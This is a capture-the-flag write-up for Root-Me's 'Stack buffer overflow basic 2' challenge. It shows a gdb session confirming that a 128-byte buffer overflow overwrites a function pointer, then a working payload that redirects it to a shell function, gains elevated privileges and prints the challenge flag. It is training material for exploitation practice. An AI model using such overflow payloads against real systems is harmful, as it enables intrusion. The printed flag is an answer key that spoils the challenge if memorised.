# ELF x86 - Stack buffer overflow basic 2
https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-2
```
Pwn the binary, read the flag in .passwd.

Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch15@challenge02.root-me.org  
Username	app-systeme-ch15
Password	app-systeme-ch15
```
Like [ELF x86 - Stack buffer overflow basic 1](https://github.com/galbarak4/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%201), there is a _buf_ variable (128 bytes).
But now there is a function pointer, _func_. Again no (serious) boundary check, so one can overflow the _buf_ variable and set the _func_ pointer to point to whatever he needs.<br>

First, let's verify that 132 bytes are enough for overwriting the _func_ pointer:
```gdb
(gdb) run < <(python -c "print 'A'*128+'DDDD'")
Starting program: /challenge/app-systeme/ch15/ch15 < <(python -c "print 'A'*128+'DDDD'")

Breakpoint 4, 0x080484c7 in main ()
(gdb) info registers
eax            0x44444444	1145324612
ecx            0xbffffafc	-1073743108
edx            0xb7fd18a4	-1208149852
ebx            0xb7fd0000	-1208156160
esp            0xbffffae0	0xbffffae0
ebp            0xbffffb88	0xbffffb88
esi            0x0	0
edi            0x0	0
eip            0x80484c7	0x80484c7 <main+59>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

As you may notice, the **eax** register set to "DDDD", right before the instruction ```call   *%eax```.<br>
Now, all left to do is change the "DDDD" to the **shell** function, and the program would call it:
```sh
app-systeme-ch15@challenge02:~$ cat <(python -c "print 'A'*128+'\x64\x84\x04\x08'") - | ./ch15
id
uid=1115(app-systeme-ch15) gid=1115(app-systeme-ch15) euid=1215(app-systeme-ch15-cracked) groups=1215(app-systeme-ch15-cracked),100(users),1115(app-systeme-ch15)
cat .passwd
B33r1sSoG0oD4y0urBr4iN
```
